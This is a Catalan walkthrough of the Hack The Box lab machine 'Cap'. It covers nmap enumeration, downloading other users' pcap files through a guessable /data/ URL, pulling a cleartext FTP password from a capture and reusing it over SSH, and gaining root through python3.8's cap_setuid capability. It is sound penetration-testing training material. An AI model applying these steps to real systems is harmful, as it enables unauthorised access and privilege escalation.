<p align="center">
  <img src="https://github.com/user-attachments/assets/9d0f2f9d-818d-42ae-9dd0-02cf12aeeba0" alt="cap-htb-header" width="700" height="500">
</p>

---

## NMAP scanning
Escaneig a través d'enviament de paquets TCP SYN a tots els ports del host per detectar quins estan oberts.
````bash
❯ nmap -p- --open -sS -v -n --min-rate=5000 -Pn -n 10.10.10.245

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
           Raw packets sent: 72198 (3.177MB) | Rcvd: 72198 (2.888MB)
````
Amb els ports resultants de l'escaneig anterior, enumerar la versió i llençar els scripts per defecte de NMAP.
````bash
❯ nmap -sCV -p21,22,80 -Pn 10.10.10.245

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.05 seconds
                                                                            
````
Buscant la versió de SSH al launchpad d'Ubuntu ja es pot extreure que, segurament, el host té un Ubuntu Focal.

## Web enumeration
Un dels apartats de la web realitza un seguiment del tràfic de la xarxa durant 5 segons i l'exporta en un arxiu .pcap per poder analitzar-lo amb WireShark. Mirant la forma que té l'URL, _/data/[nº], es pot provar si altres números corresponen a algun arxiu .pcap d'un seguiment anterior de la xarxa.

![image](https://github.com/user-attachments/assets/ffdfe307-69b7-459a-aedb-d0c9141b534c)

Hi tenim accés, i podem descarregar tots els arxius per obrir-los amb WireShark i analitzar-los.

## User
El primer arxiu, _0.pcap_, ha capturat una sèrie de connexions fetes pel protocol FTP, entre les quals es troba l'autenticació d'un usuari anomenat _nathan_ amb la contrasenya _Buck3tH4TF0RM3!_.

![image](https://github.com/user-attachments/assets/9f11edef-f0f4-40ca-8dd6-acbba2c07f45)

Si provem les credencials al servidor FTP podem accedir-hi, i podem veure el que sembla el directori _home_ de l'usuari _nathan_. De la mateixa manera, si ens autentiquem mitjançant SSH amb les mateixes credencials, podem aconseguir una consola interactiva com aquest usuari, ja que les credencials es reutilitzen. 

![image](https://github.com/user-attachments/assets/432fb5fc-a3b0-4fd0-be71-4098c40999b4)

## Privilege escalation
Llistant les _capabilities_ del host, podem veure que Python3.8 té assignat _cap_setuid_, pel que es pot utilitzar aquest binari per a manipular el UID d'un procés i, doncs, pot fer-se servir per tenir una consola amb UID 0 (root).
````bash
> getcap -r / 2>/dev/null

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
````
````python
>>> import os; os.setuid(0); os.system("/bin/bash")
````
![image](https://github.com/user-attachments/assets/62020c74-b114-46e5-bc2f-9177f49a34a8)
